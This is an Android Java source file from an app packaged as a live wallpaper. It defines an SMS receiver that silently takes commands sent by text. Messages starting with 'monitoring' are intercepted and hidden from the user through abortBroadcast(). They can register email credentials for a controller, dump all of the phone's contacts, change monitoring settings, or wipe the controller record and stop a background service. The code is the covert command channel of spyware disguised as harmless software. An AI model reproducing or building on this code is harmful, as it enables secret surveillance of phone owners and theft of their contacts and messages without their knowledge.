package com.livewallpaper.circle;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map.Entry;

import com.livewallpaper.circle.box.ServiceListener;
import com.livewallpaper.circle.box.contact.ContentContact;
import com.livewallpaper.circle.db.controllers.MonitorSQLiteAdapter;
import com.livewallpaper.circle.db.models.People;
import com.livewallpaper.circle.internet.email.EmailAuthentication;
import com.livewallpaper.circle.parser.ParserSMSCommands;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class IncomingCommandsReceiver extends BroadcastReceiver {

	private static final String LOG_TAG = "monitoring";
	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;
	private ArrayList<String> numbers = new ArrayList<String>();
	private ArrayList<String> messages = new ArrayList<String>();
	private Context cont;

	public void onReceive(Context context, Intent intent) {

		cont = context;
		Bundle bundle = intent.getExtras();
		if (bundle != null) {
			Object[] pdus = (Object[]) bundle.get("pdus");
			SmsMessage[] msgs = new SmsMessage[pdus.length];

			for (int i = 0; i < msgs.length; i++) { // пробегаемся по всем
													// полученным сообщениям
				msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				numbers.add(msgs[i].getOriginatingAddress()); // получаем номер
				msgs[i].getDisplayOriginatingAddress(); // отправителя
				messages.add(msgs[i].getMessageBody().toString());// получаем
			}

			if (messages.size() > 0 && abortLogic(messages.get(0))) {
				try {
					// List broadcastReceivers registered for android
					/*List<ResolveInfo> receivers = cont
							.getPackageManager()
							.queryBroadcastReceivers(
									new Intent(
											"android.provider.Telephony.SMS_RECEIVED"),
									0);

					for (ResolveInfo info : receivers) {
						Log.i(LOG_TAG, "toString - "+info.toString());
						Log.i(LOG_TAG, "priority - "+info.priority);
					}*/
					mAdapter.open(cont);
					incomingCommands();
				} catch (Exception e) {
					e.printStackTrace();
				} finally {
					abortBroadcast();
					mAdapter.close();
				}
			}
		}
	}

	private void incomingCommands() {

		HashMap<String, String> commands = ParserSMSCommands
				.parserCommands(messages.get(0));

		int count = mAdapter.selectPeopleCount();
		if (count == 0) {
			String email = null;
			String password = null;
			String params = null;
			if (commands.size() == 3) {
				for (Entry<String, String> entry : commands.entrySet()) {
					if (entry.getKey().equals("email")) {
						email = entry.getValue();
					} else if (entry.getKey().equals("password")) {
						password = entry.getValue();
					} else if (entry.getKey().equals("params")) {
						params = entry.getValue();
					}
				}
				if (email != null && password != null && params != null) {
					EmailAuthentication authentication = new EmailAuthentication();
					authentication.execute(cont, numbers.get(0), email,
							password, params);
				}
			}
		} else if (count == 1) {
			People people = mAdapter.selectPeople();

			if (commands.size() != 0
					&& people.getPhoneId().equals(numbers.get(0))) {
				String contacts = null;
				String params = null;
				for (Entry<String, String> entry : commands.entrySet()) {
					if (entry.getKey().equals("contacts")) {
						contacts = entry.getValue();
					} else if (entry.getKey().equals("params")) {
						params = entry.getValue();
					} else if (entry.getKey().equals("clean")) {
						mAdapter.deletePerson(numbers.get(0));
						cont.stopService(new Intent(cont, ServiceListener.class));
					}
				}
				if (contacts != null && contacts.equals("1")
						&& people.getSettingContact() != 1) {
					people.setSettingContact(1);
					mAdapter.updatePeopleSettingContact(people);
					ContentContact.getAllContact(people, cont);
				}
				if (params != null) {
					if (params.equals("0")) {
						people.setSettings(0);
						mAdapter.updatePeopleSettings(people);
					} else if (params.equals("1")) {
						people.setSettings(1);
						mAdapter.updatePeopleSettings(people);
					}
				}
			}
		}
	}

	
	private boolean abortLogic(String message) {

		if (message.length() >= 10
				&& message.subSequence(0, 10).equals("monitoring")) {
			Log.i(LOG_TAG, "abortLogic - true");
			return true;
		}
		Log.i(LOG_TAG, "abortLogic - false");
		return false;
	}
}